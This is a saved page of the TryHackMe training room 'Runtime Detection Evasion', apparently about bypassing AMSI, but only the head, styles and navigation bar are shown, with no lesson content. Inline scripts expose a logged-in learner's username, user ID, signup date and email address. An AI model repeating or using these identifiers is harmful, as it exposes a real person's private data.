<!DOCTYPE html>
<!-- saved from url=(0050)https://tryhackme.com/room/runtimedetectionevasion -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>TryHackMe | Runtime Detection Evasion</title>
<meta name="description" content="Learn how to bypass common runtime detection measures, such as AMSI, using modern tool-agnostic approaches.">
<meta name="og:description" content="Learn how to bypass common runtime detection measures, such as AMSI, using modern tool-agnostic approaches.">
<meta name="keywords" content="cyber,security,cyber security,cyber security training,coding,computer,bitcoin,hacking,hackers,hacks,hack,exploits,keylogger,learn,poc">
<meta name="viewport" content="width=device-width,initial-scale=1.0">

<meta property="og:site_name" content="TryHackMe">
<meta property="og:title" content="TryHackMe | Runtime Detection Evasion">
<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/room-icons/f15baa9526326b2c25365dafbe8d1767.png">
<meta property="og:url" content="https://tryhackme.com/room/runtimedetectionevasion">
<meta name="twitter:image" content="https://tryhackme.com/img/meta/default.png">
<meta property="og:description" content="Learn how to bypass common runtime detection measures, such as AMSI, using modern tool-agnostic approaches.">

<script type="text/javascript" async="" src="./TryHackMe _ Runtime Detection Evasion_files/pgpbhph6"></script><script src="./TryHackMe _ Runtime Detection Evasion_files/jquery.min.js"></script>
<script src="./TryHackMe _ Runtime Detection Evasion_files/popper.min.js"></script>
<link rel="stylesheet" href="./TryHackMe _ Runtime Detection Evasion_files/boostrap431.min.css">
<script src="./TryHackMe _ Runtime Detection Evasion_files/bootstrap431.min.js"></script>
<link rel="stylesheet" href="./TryHackMe _ Runtime Detection Evasion_files/animate.min.css">
<link rel="stylesheet" href="./TryHackMe _ Runtime Detection Evasion_files/all.css" integrity="sha384-ekOryaXPbeCpWQNxMwSWVvQ0+1VrStoPJq54shlYhR8HzQgig1v5fas6YgOqLoKz" crossorigin="anonymous">
<link rel="icon" type="image/png" href="https://assets.tryhackme.com/img/favicon.png">
<link rel="stylesheet" media="screen" href="./TryHackMe _ Runtime Detection Evasion_files/general-style.css">
<script src="./TryHackMe _ Runtime Detection Evasion_files/script.js"></script>
<script src="./TryHackMe _ Runtime Detection Evasion_files/validation.js"></script>

<link rel="stylesheet" type="text/css" href="./TryHackMe _ Runtime Detection Evasion_files/cookieconsent.min.css">
<script src="./TryHackMe _ Runtime Detection Evasion_files/cookieconsent.min.js"></script>
<script async="" src="./TryHackMe _ Runtime Detection Evasion_files/js"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
  
    gtag('config', 'G-Z8D4WL3D4P');
  </script>


<script>
    window.intercomSettings = {
      api_base: "https://api-iam.intercom.io",
      app_id: "pgpbhph6"
    };
  </script>
<script>
    (function (h, o, t, j, a, r) {
      h.hj = h.hj || function () { (h.hj.q = h.hj.q || []).push(arguments) };
      h._hjSettings = { hjid: 1950941, hjsv: 6 };
      a = o.getElementsByTagName('head')[0];
      r = o.createElement('script'); r.async = 1;
      r.src = t + h._hjSettings.hjid + j + h._hjSettings.hjsv;
      a.appendChild(r);
    })(window, document, 'https://static.hotjar.com/c/hotjar-', '.js?sv=');
  </script><script async="" src="./TryHackMe _ Runtime Detection Evasion_files/hotjar-1950941.js"></script>
<script>
    /* Global javascript variables */

    // Used inside script.js for createRooms compelted users.
    const username = 'Silv3rsurf3r'
    const subscribed = '1'
    const level = '10'
    const intercomEnabled = 'true'
  </script>
<script>
    //add back tracking info
    const userId = "63d14e7f857ae10041bb192f"
    let tutorialComplete = false
    if ('false' == "true") {
      tutorialComplete = true
    }
    if(intercomEnabled === "true"){
      window.intercomSettings = {
        api_base: "https://api-iam.intercom.io",
        app_id: "pgpbhph6",
        user_id: userId,
        username: username,
        email: "giftonpaul@karunya.edu.in",
        created_at: Math.floor(new Date("Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)").getTime() / 1000) // Signup date as a Unix timestamp
      };
    }
    window.hj('identify', userId, {
      displayName: username,
      subscribed: "1",
      dateSignUp: "Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)",
      experience: "advanced"
    })
  </script>
<script type="application/ld+json">

   {
      "@context":"https://schema.org",
      "@type":"Organization",
      "url":"https://tryhackme.com",
      "name":"TryHackMe",
      "logo":"https://tryhackme.com/img/favicon.png",
      "description":"TryHackMe is a free online platform for learning cyber security, using hands-on exercises and labs, all through your browser!",
      "email": "support@tryhackme.com",
      "sameAs":[
         "https://www.linkedin.com/company/tryhackme",
         "https://twitter.com/realtryhackme"
      ]
   }

</script>
<script>
    console.log(`%c
      ------------------
      < Happy Hacking! >
      ------------------
              \\   ^__^
               \\  (oo)\\_______
                  (__)\\       )\\/\\
                      ||----w |
                      ||     ||`, "font-family:monospace")
  </script>
<script>
  (function(){var w=window;var ic=w.Intercom;if(typeof ic==="function"){ic('reattach_activator');ic('update',w.intercomSettings);}else{var d=document;var i=function(){i.c(arguments);};i.q=[];i.c=function(args){i.q.push(args);};w.Intercom=i;var l=function(){var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='https://widget.intercom.io/widget/pgpbhph6';var x=d.getElementsByTagName('script')[0];x.parentNode.insertBefore(s,x);};if(document.readyState==='complete'){l();}else if(w.attachEvent){w.attachEvent('onload',l);}else{w.addEventListener('load',l,false);}}})();
</script>
<script src="./TryHackMe _ Runtime Detection Evasion_files/socket.io.js"></script><script>
  let socket = io.connect({
    transports: ['websocket'],
    reconnection: true,
    reconnectionDelay: 1000,
    reconnectionAttempts: 10
  })
</script><script async="" src="./TryHackMe _ Runtime Detection Evasion_files/modules.5957fbf26d1b525b5a12.js" charset="utf-8"></script><style type="text/css">.apexcharts-canvas {
  position: relative;
  user-select: none;
  /* cannot give overflow: hidden as it will crop tooltips which overflow outside chart area */
}


/* scrollbar is not visible by default for legend, hence forcing the visibility */
.apexcharts-canvas ::-webkit-scrollbar {
  -webkit-appearance: none;
  width: 6px;
}

.apexcharts-canvas ::-webkit-scrollbar-thumb {
  border-radius: 4px;
  background-color: rgba(0, 0, 0, .5);
  box-shadow: 0 0 1px rgba(255, 255, 255, .5);
  -webkit-box-shadow: 0 0 1px rgba(255, 255, 255, .5);
}


.apexcharts-inner {
  position: relative;
}

.apexcharts-text tspan {
  font-family: inherit;
}

.legend-mouseover-inactive {
  transition: 0.15s ease all;
  opacity: 0.20;
}

.apexcharts-series-collapsed {
  opacity: 0;
}

.apexcharts-tooltip {
  border-radius: 5px;
  box-shadow: 2px 2px 6px -4px #999;
  cursor: default;
  font-size: 14px;
  left: 62px;
  opacity: 0;
  pointer-events: none;
  position: absolute;
  top: 20px;
  display: flex;
  flex-direction: column;
  overflow: hidden;
  white-space: nowrap;
  z-index: 12;
  transition: 0.15s ease all;
}

.apexcharts-tooltip.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-tooltip.apexcharts-theme-light {
  border: 1px solid #e3e3e3;
  background: rgba(255, 255, 255, 0.96);
}

.apexcharts-tooltip.apexcharts-theme-dark {
  color: #fff;
  background: rgba(30, 30, 30, 0.8);
}

.apexcharts-tooltip * {
  font-family: inherit;
}


.apexcharts-tooltip-title {
  padding: 6px;
  font-size: 15px;
  margin-bottom: 4px;
}

.apexcharts-tooltip.apexcharts-theme-light .apexcharts-tooltip-title {
  background: #ECEFF1;
  border-bottom: 1px solid #ddd;
}

.apexcharts-tooltip.apexcharts-theme-dark .apexcharts-tooltip-title {
  background: rgba(0, 0, 0, 0.7);
  border-bottom: 1px solid #333;
}

.apexcharts-tooltip-text-y-value,
.apexcharts-tooltip-text-goals-value,
.apexcharts-tooltip-text-z-value {
  display: inline-block;
  font-weight: 600;
  margin-left: 5px;
}

.apexcharts-tooltip-text-y-label:empty,
.apexcharts-tooltip-text-y-value:empty,
.apexcharts-tooltip-text-goals-label:empty,
.apexcharts-tooltip-text-goals-value:empty,
.apexcharts-tooltip-text-z-value:empty {
  display: none;
}

.apexcharts-tooltip-text-y-value,
.apexcharts-tooltip-text-goals-value,
.apexcharts-tooltip-text-z-value {
  font-weight: 600;
}

.apexcharts-tooltip-text-goals-label, 
.apexcharts-tooltip-text-goals-value {
  padding: 6px 0 5px;
}

.apexcharts-tooltip-goals-group, 
.apexcharts-tooltip-text-goals-label, 
.apexcharts-tooltip-text-goals-value {
  display: flex;
}
.apexcharts-tooltip-text-goals-label:not(:empty),
.apexcharts-tooltip-text-goals-value:not(:empty) {
  margin-top: -6px;
}

.apexcharts-tooltip-marker {
  width: 12px;
  height: 12px;
  position: relative;
  top: 0px;
  margin-right: 10px;
  border-radius: 50%;
}

.apexcharts-tooltip-series-group {
  padding: 0 10px;
  display: none;
  text-align: left;
  justify-content: left;
  align-items: center;
}

.apexcharts-tooltip-series-group.apexcharts-active .apexcharts-tooltip-marker {
  opacity: 1;
}

.apexcharts-tooltip-series-group.apexcharts-active,
.apexcharts-tooltip-series-group:last-child {
  padding-bottom: 4px;
}

.apexcharts-tooltip-series-group-hidden {
  opacity: 0;
  height: 0;
  line-height: 0;
  padding: 0 !important;
}

.apexcharts-tooltip-y-group {
  padding: 6px 0 5px;
}

.apexcharts-tooltip-box, .apexcharts-custom-tooltip {
  padding: 4px 8px;
}

.apexcharts-tooltip-boxPlot {
  display: flex;
  flex-direction: column-reverse;
}

.apexcharts-tooltip-box>div {
  margin: 4px 0;
}

.apexcharts-tooltip-box span.value {
  font-weight: bold;
}

.apexcharts-tooltip-rangebar {
  padding: 5px 8px;
}

.apexcharts-tooltip-rangebar .category {
  font-weight: 600;
  color: #777;
}

.apexcharts-tooltip-rangebar .series-name {
  font-weight: bold;
  display: block;
  margin-bottom: 5px;
}

.apexcharts-xaxistooltip {
  opacity: 0;
  padding: 9px 10px;
  pointer-events: none;
  color: #373d3f;
  font-size: 13px;
  text-align: center;
  border-radius: 2px;
  position: absolute;
  z-index: 10;
  background: #ECEFF1;
  border: 1px solid #90A4AE;
  transition: 0.15s ease all;
}

.apexcharts-xaxistooltip.apexcharts-theme-dark {
  background: rgba(0, 0, 0, 0.7);
  border: 1px solid rgba(0, 0, 0, 0.5);
  color: #fff;
}

.apexcharts-xaxistooltip:after,
.apexcharts-xaxistooltip:before {
  left: 50%;
  border: solid transparent;
  content: " ";
  height: 0;
  width: 0;
  position: absolute;
  pointer-events: none;
}

.apexcharts-xaxistooltip:after {
  border-color: rgba(236, 239, 241, 0);
  border-width: 6px;
  margin-left: -6px;
}

.apexcharts-xaxistooltip:before {
  border-color: rgba(144, 164, 174, 0);
  border-width: 7px;
  margin-left: -7px;
}

.apexcharts-xaxistooltip-bottom:after,
.apexcharts-xaxistooltip-bottom:before {
  bottom: 100%;
}

.apexcharts-xaxistooltip-top:after,
.apexcharts-xaxistooltip-top:before {
  top: 100%;
}

.apexcharts-xaxistooltip-bottom:after {
  border-bottom-color: #ECEFF1;
}

.apexcharts-xaxistooltip-bottom:before {
  border-bottom-color: #90A4AE;
}

.apexcharts-xaxistooltip-bottom.apexcharts-theme-dark:after {
  border-bottom-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-bottom.apexcharts-theme-dark:before {
  border-bottom-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-top:after {
  border-top-color: #ECEFF1
}

.apexcharts-xaxistooltip-top:before {
  border-top-color: #90A4AE;
}

.apexcharts-xaxistooltip-top.apexcharts-theme-dark:after {
  border-top-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-top.apexcharts-theme-dark:before {
  border-top-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-yaxistooltip {
  opacity: 0;
  padding: 4px 10px;
  pointer-events: none;
  color: #373d3f;
  font-size: 13px;
  text-align: center;
  border-radius: 2px;
  position: absolute;
  z-index: 10;
  background: #ECEFF1;
  border: 1px solid #90A4AE;
}

.apexcharts-yaxistooltip.apexcharts-theme-dark {
  background: rgba(0, 0, 0, 0.7);
  border: 1px solid rgba(0, 0, 0, 0.5);
  color: #fff;
}

.apexcharts-yaxistooltip:after,
.apexcharts-yaxistooltip:before {
  top: 50%;
  border: solid transparent;
  content: " ";
  height: 0;
  width: 0;
  position: absolute;
  pointer-events: none;
}

.apexcharts-yaxistooltip:after {
  border-color: rgba(236, 239, 241, 0);
  border-width: 6px;
  margin-top: -6px;
}

.apexcharts-yaxistooltip:before {
  border-color: rgba(144, 164, 174, 0);
  border-width: 7px;
  margin-top: -7px;
}

.apexcharts-yaxistooltip-left:after,
.apexcharts-yaxistooltip-left:before {
  left: 100%;
}

.apexcharts-yaxistooltip-right:after,
.apexcharts-yaxistooltip-right:before {
  right: 100%;
}

.apexcharts-yaxistooltip-left:after {
  border-left-color: #ECEFF1;
}

.apexcharts-yaxistooltip-left:before {
  border-left-color: #90A4AE;
}

.apexcharts-yaxistooltip-left.apexcharts-theme-dark:after {
  border-left-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-left.apexcharts-theme-dark:before {
  border-left-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-right:after {
  border-right-color: #ECEFF1;
}

.apexcharts-yaxistooltip-right:before {
  border-right-color: #90A4AE;
}

.apexcharts-yaxistooltip-right.apexcharts-theme-dark:after {
  border-right-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-right.apexcharts-theme-dark:before {
  border-right-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip.apexcharts-active {
  opacity: 1;
}

.apexcharts-yaxistooltip-hidden {
  display: none;
}

.apexcharts-xcrosshairs,
.apexcharts-ycrosshairs {
  pointer-events: none;
  opacity: 0;
  transition: 0.15s ease all;
}

.apexcharts-xcrosshairs.apexcharts-active,
.apexcharts-ycrosshairs.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-ycrosshairs-hidden {
  opacity: 0;
}

.apexcharts-selection-rect {
  cursor: move;
}

.svg_select_boundingRect, .svg_select_points_rot {
  pointer-events: none;
  opacity: 0;
  visibility: hidden;
}
.apexcharts-selection-rect + g .svg_select_boundingRect,
.apexcharts-selection-rect + g .svg_select_points_rot {
  opacity: 0;
  visibility: hidden;
}

.apexcharts-selection-rect + g .svg_select_points_l,
.apexcharts-selection-rect + g .svg_select_points_r {
  cursor: ew-resize;
  opacity: 1;
  visibility: visible;
}

.svg_select_points {
  fill: #efefef;
  stroke: #333;
  rx: 2;
}

.apexcharts-svg.apexcharts-zoomable.hovering-zoom {
  cursor: crosshair
}

.apexcharts-svg.apexcharts-zoomable.hovering-pan {
  cursor: move
}

.apexcharts-zoom-icon,
.apexcharts-zoomin-icon,
.apexcharts-zoomout-icon,
.apexcharts-reset-icon,
.apexcharts-pan-icon,
.apexcharts-selection-icon,
.apexcharts-menu-icon,
.apexcharts-toolbar-custom-icon {
  cursor: pointer;
  width: 20px;
  height: 20px;
  line-height: 24px;
  color: #6E8192;
  text-align: center;
}

.apexcharts-zoom-icon svg,
.apexcharts-zoomin-icon svg,
.apexcharts-zoomout-icon svg,
.apexcharts-reset-icon svg,
.apexcharts-menu-icon svg {
  fill: #6E8192;
}

.apexcharts-selection-icon svg {
  fill: #444;
  transform: scale(0.76)
}

.apexcharts-theme-dark .apexcharts-zoom-icon svg,
.apexcharts-theme-dark .apexcharts-zoomin-icon svg,
.apexcharts-theme-dark .apexcharts-zoomout-icon svg,
.apexcharts-theme-dark .apexcharts-reset-icon svg,
.apexcharts-theme-dark .apexcharts-pan-icon svg,
.apexcharts-theme-dark .apexcharts-selection-icon svg,
.apexcharts-theme-dark .apexcharts-menu-icon svg,
.apexcharts-theme-dark .apexcharts-toolbar-custom-icon svg {
  fill: #f3f4f5;
}

.apexcharts-canvas .apexcharts-zoom-icon.apexcharts-selected svg,
.apexcharts-canvas .apexcharts-selection-icon.apexcharts-selected svg,
.apexcharts-canvas .apexcharts-reset-zoom-icon.apexcharts-selected svg {
  fill: #008FFB;
}

.apexcharts-theme-light .apexcharts-selection-icon:not(.apexcharts-selected):hover svg,
.apexcharts-theme-light .apexcharts-zoom-icon:not(.apexcharts-selected):hover svg,
.apexcharts-theme-light .apexcharts-zoomin-icon:hover svg,
.apexcharts-theme-light .apexcharts-zoomout-icon:hover svg,
.apexcharts-theme-light .apexcharts-reset-icon:hover svg,
.apexcharts-theme-light .apexcharts-menu-icon:hover svg {
  fill: #333;
}

.apexcharts-selection-icon,
.apexcharts-menu-icon {
  position: relative;
}

.apexcharts-reset-icon {
  margin-left: 5px;
}

.apexcharts-zoom-icon,
.apexcharts-reset-icon,
.apexcharts-menu-icon {
  transform: scale(0.85);
}

.apexcharts-zoomin-icon,
.apexcharts-zoomout-icon {
  transform: scale(0.7)
}

.apexcharts-zoomout-icon {
  margin-right: 3px;
}

.apexcharts-pan-icon {
  transform: scale(0.62);
  position: relative;
  left: 1px;
  top: 0px;
}

.apexcharts-pan-icon svg {
  fill: #fff;
  stroke: #6E8192;
  stroke-width: 2;
}

.apexcharts-pan-icon.apexcharts-selected svg {
  stroke: #008FFB;
}

.apexcharts-pan-icon:not(.apexcharts-selected):hover svg {
  stroke: #333;
}

.apexcharts-toolbar {
  position: absolute;
  z-index: 11;
  max-width: 176px;
  text-align: right;
  border-radius: 3px;
  padding: 0px 6px 2px 6px;
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.apexcharts-menu {
  background: #fff;
  position: absolute;
  top: 100%;
  border: 1px solid #ddd;
  border-radius: 3px;
  padding: 3px;
  right: 10px;
  opacity: 0;
  min-width: 110px;
  transition: 0.15s ease all;
  pointer-events: none;
}

.apexcharts-menu.apexcharts-menu-open {
  opacity: 1;
  pointer-events: all;
  transition: 0.15s ease all;
}

.apexcharts-menu-item {
  padding: 6px 7px;
  font-size: 12px;
  cursor: pointer;
}

.apexcharts-theme-light .apexcharts-menu-item:hover {
  background: #eee;
}

.apexcharts-theme-dark .apexcharts-menu {
  background: rgba(0, 0, 0, 0.7);
  color: #fff;
}

@media screen and (min-width: 768px) {
  .apexcharts-canvas:hover .apexcharts-toolbar {
    opacity: 1;
  }
}

.apexcharts-datalabel.apexcharts-element-hidden {
  opacity: 0;
}

.apexcharts-pie-label,
.apexcharts-datalabels,
.apexcharts-datalabel,
.apexcharts-datalabel-label,
.apexcharts-datalabel-value {
  cursor: default;
  pointer-events: none;
}

.apexcharts-pie-label-delay {
  opacity: 0;
  animation-name: opaque;
  animation-duration: 0.3s;
  animation-fill-mode: forwards;
  animation-timing-function: ease;
}

.apexcharts-canvas .apexcharts-element-hidden {
  opacity: 0;
}

.apexcharts-hide .apexcharts-series-points {
  opacity: 0;
}

.apexcharts-gridline,
.apexcharts-annotation-rect,
.apexcharts-tooltip .apexcharts-marker,
.apexcharts-area-series .apexcharts-area,
.apexcharts-line,
.apexcharts-zoom-rect,
.apexcharts-toolbar svg,
.apexcharts-area-series .apexcharts-series-markers .apexcharts-marker.no-pointer-events,
.apexcharts-line-series .apexcharts-series-markers .apexcharts-marker.no-pointer-events,
.apexcharts-radar-series path,
.apexcharts-radar-series polygon {
  pointer-events: none;
}


/* markers */

.apexcharts-marker {
  transition: 0.15s ease all;
}

@keyframes opaque {
  0% {
    opacity: 0;
  }
  100% {
    opacity: 1;
  }
}


/* Resize generated styles */

@keyframes resizeanim {
  from {
    opacity: 0;
  }
  to {
    opacity: 0;
  }
}

.resize-triggers {
  animation: 1ms resizeanim;
  visibility: hidden;
  opacity: 0;
}

.resize-triggers,
.resize-triggers>div,
.contract-trigger:before {
  content: " ";
  display: block;
  position: absolute;
  top: 0;
  left: 0;
  height: 100%;
  width: 100%;
  overflow: hidden;
}

.resize-triggers>div {
  background: #eee;
  overflow: auto;
}

.contract-trigger:before {
  width: 200%;
  height: 200%;
}</style><style data-jss="" data-meta="MuiDialog">
@media print {
  .MuiDialog-root {
    position: absolute !important;
  }
}
.MuiDialog-scrollPaper {
  display: flex;
  align-items: center;
  justify-content: center;
}
.MuiDialog-scrollBody {
  overflow-x: hidden;
  overflow-y: auto;
  text-align: center;
}
.MuiDialog-scrollBody:after {
  width: 0;
  height: 100%;
  content: "";
  display: inline-block;
  vertical-align: middle;
}
.MuiDialog-container {
  height: 100%;
  outline: 0;
}
@media print {
  .MuiDialog-container {
    height: auto;
  }
}
.MuiDialog-paper {
  margin: 32px;
  position: relative;
  overflow-y: auto;
}
@media print {
  .MuiDialog-paper {
    box-shadow: none;
    overflow-y: visible;
  }
}
.MuiDialog-paperScrollPaper {
  display: flex;
  max-height: calc(100% - 64px);
  flex-direction: column;
}
.MuiDialog-paperScrollBody {
  display: inline-block;
  text-align: left;
  vertical-align: middle;
}
.MuiDialog-paperWidthFalse {
  max-width: calc(100% - 64px);
}
.MuiDialog-paperWidthXs {
  max-width: 444px;
}
@media (max-width:507.95px) {
  .MuiDialog-paperWidthXs.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthSm {
  max-width: 600px;
}
@media (max-width:663.95px) {
  .MuiDialog-paperWidthSm.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthMd {
  max-width: 960px;
}
@media (max-width:1023.95px) {
  .MuiDialog-paperWidthMd.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthLg {
  max-width: 1280px;
}
@media (max-width:1343.95px) {
  .MuiDialog-paperWidthLg.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthXl {
  max-width: 1920px;
}
@media (max-width:1983.95px) {
  .MuiDialog-paperWidthXl.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperFullWidth {
  width: calc(100% - 64px);
}
.MuiDialog-paperFullScreen {
  width: 100%;
  height: 100%;
  margin: 0;
  max-width: 100%;
  max-height: none;
  border-radius: 0;
}
.MuiDialog-paperFullScreen.MuiDialog-paperScrollBody {
  margin: 0;
  max-width: 100%;
}
</style><style></style><meta http-equiv="origin-trial" content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9"></head>


<body class="" style=""><div role="dialog" aria-live="polite" aria-label="cookieconsent" aria-describedby="cookieconsent:desc" class="cc-window cc-floating cc-type-info cc-theme-classic cc-bottom cc-right cc-color-override-382972913 cc-invisible" style="display: none;"><!--googleoff: all--><span id="cookieconsent:desc" class="cc-message">We use cookies to ensure you get the best user experience. For more information contact us. <a aria-label="learn more about cookies" role="button" tabindex="0" class="cc-link" href="https://tryhackme.com/legal/terms-of-use" target="_blank">Read more</a></span><div class="cc-compliance"><a aria-label="dismiss cookie message" role="button" tabindex="0" class="cc-btn cc-dismiss">Got it!</a></div><!--googleon: all--></div>
<link href="./TryHackMe _ Runtime Detection Evasion_files/scoreboard.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Runtime Detection Evasion_files/introjs.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Runtime Detection Evasion_files/slideout.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Runtime Detection Evasion_files/public-rooms.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Runtime Detection Evasion_files/asciinema-player.css" rel="stylesheet" type="text/css"> 
<link href="./TryHackMe _ Runtime Detection Evasion_files/prism.css" rel="stylesheet" type="text/css"> 
<link href="./TryHackMe _ Runtime Detection Evasion_files/magnific-popup.css" rel="stylesheet" type="text/css"> 
<script src="./TryHackMe _ Runtime Detection Evasion_files/lottie-player.js"></script>

<div id="room-content" class="">
<div id="room-content-main" class="" style="">
<nav class="navbar navbar-expand-md navbar-dark navbar-color-loggedin navbar-main">
<div class="container">
<button id="thm-mobile-nav-open" class="thm-nav__hamburger-btn" data-target="#thm-mobile-nav-menu" aria-controls="thm-mobile-nav-menu" aria-expanded="false" aria-label="Open mobile navigation">
<span class="thm-nav__hamburger-lines"></span>
</button>
<div class="collapse navbar-collapse justify-content-end" id="navbarSupportedContent">
<div class="navbar-brand" href="/">
<a href="https://tryhackme.com/dashboard">
<img width="115px" src="./TryHackMe _ Runtime Detection Evasion_files/tryhackme_logo_full.svg" alt="TryHackMe" class="logo">
</a>
</div>
<ul class="navbar-nav mr-auto mt-2 mt-lg-0 navbar-pagelinks">
<li class="nav-item ">
<a class="nav-link" href="https://tryhackme.com/dashboard">
<i class="navbar-item-icon far fa-browser"></i>
<div class="navbar-item-text">Dashboard</div>
</a>
</li>
<li class="nav-item active" id="nav-learn">
<a class="nav-link" href="https://tryhackme.com/hacktivities">
<i class="navbar-item-icon far fa-book-open"></i>
<div class="navbar-item-text">Learn</div>
</a>
</li>
<li class="nav-item  dropdown lite-removable">
<a id="nav-other" class="nav-link" href="https://tryhackme.com/room/runtimedetectionevasion#" data-toggle="dropdown">
<i class="navbar-item-icon far fa-trophy"></i>
<div class="navbar-item-text">Compete</div>
</a>
<div class="dropdown-menu" aria-labelledby="navbarDropdown">
<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/leaderboards">
<div class="dropdown-menu-icon">
<i class="fas fa-trophy"></i>
</div>
<div class="dropdown-menu-desc">
<span class="mb-0">Leaderboards</span>
<div class="text-lgray size-12">Platform Rankings</div>
</div>
</a>
<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/games/koth">
<div class="dropdown-menu-icon">
<i class="fas fa-crown"></i>
</div>
<div class="dropdown-menu-desc">
<span class="mb-0">King of the Hill</span>
<div class="text-lgray size-12">Attack &amp; Defend</div>
</div>
</a>
<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/workspace">
<div class="dropdown-menu-icon">
<i class="fas fa-user-friends"></i>
</div>
<div class="dropdown-menu-desc">
<span class="mb-0">Workspace</span>
<div class="text-lgray size-12">Compete &amp; Collaborate</div>
</div>
</a>
</div>
</li>
<li class="nav-item dropdown">
<a data-cy="nav-other-menu-button" id="nav-other" class="nav-link" href="https://tryhackme.com/room/runtimedetectionevasion#" data-toggle="dropdown">
<i class="navbar-item-icon far fa-ellipsis-h-alt"></i>
<div class="navbar-item-text">Other</div>
</a>
<div data-cy="nav-other-menu" class="dropdown-menu dropdown-menu-center large-dropdown" aria-labelledby="navbarDropdown">
<span class="dropdown-menu-arrow"></span>
<a class="dropdown-item" href="https://tryhackme.com/resources">Resources</a>
<a class="dropdown-item" href="https://tryhackme.com/subscriptions">Buy Vouchers</a>
<a class="dropdown-item" href="https://tryhackme.com/develop-rooms">Develop Rooms</a>
<a class="dropdown-item" href="https://tryhackme.com/business">For Business</a>
<a class="dropdown-item" href="https://tryhackme.com/classrooms">For Education</a>
<a class="dropdown-item" target="_blank" href="https://store.tryhackme.com/">Swag Shop</a>
<a class="dropdown-item" href="https://tryhackme.com/glossary">Glossary</a>
</div>
</li>
</ul>
<ul class="navbar-nav navbar-right options vertical-align-custom">
<li class="nav-item" data-toggle="modal" data-target="#navConnModal">
<div id="thm-connection-status" class="thm-disconnected" style="display: flex;">
<div id="thm-connection-status-dot" class="dot-small"></div> <span id="thm-connection-status-txt" class="ml-2 size-18 text-white">Access Machines</span>
</div>
</li>
<li class="nav-item">
<div class="nav-item-streak">
<span id="streak-popover" class="size-24" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="bottom" data-content="&lt;p class=&#39;mb-2&#39;&gt;Complete a question every day to build your hacking streak, earn badges and streak freezes!&lt;/p&gt;

&lt;div class=&#39;size-12 faded&#39;&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;7&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Access to networks, Streak freeze&lt;/p&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;30&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Streak freeze&lt;/p&gt;
  &lt;p class=&#39;m-0&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;45&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = 5% off swag&lt;/p&gt;
&lt;/div&gt;
 &lt;div class=&#39;size-12 text-center faded mt-2 font-italic&#39;&gt;1 
        day streak freeze equipped&lt;/div&gt;" data-original-title="" title="">
<span id="user-streak" data-streak="7" class="hacker-green">7 <i class="fas fa-fire-alt"></i></span>
</span>
<script>
                            let usersStreak = { // Global variable, used in rooms logic
                                streakFirstAnswered: new Date('Mon Jul 10 2023 03:13:45 GMT+0100 (British Summer Time)'),
                                streakLastAnswered: new Date('Sun Jul 16 2023 06:14:52 GMT+0100 (British Summer Time)'),
                                usersTimezone: 'Asia/Kolkata',
                                streakFreeze: 1
                            };
                            setSidebarStreaks(usersStreak.streakFirstAnswered, usersStreak.streakLastAnswered, usersStreak.usersTimezone, usersStreak.streakFreeze)
                        </script>
</div>
</li>
<li class="nav-item dropdown" id="notification-navitem">
<a class="nav-link vertical-align-custom size-22 pl-0" href="https://tryhackme.com/room/runtimedetectionevasion#" id="notification-btn" role="button" data-toggle="dropdown">
<i id="notification-icon" class="fal fa-bell"></i>
<div id="notification-dot"></div>
</a>
<div id="nav-notification" class="dropdown-menu dropdown-menu-right">
<div id="notification-header">Notifications</div>
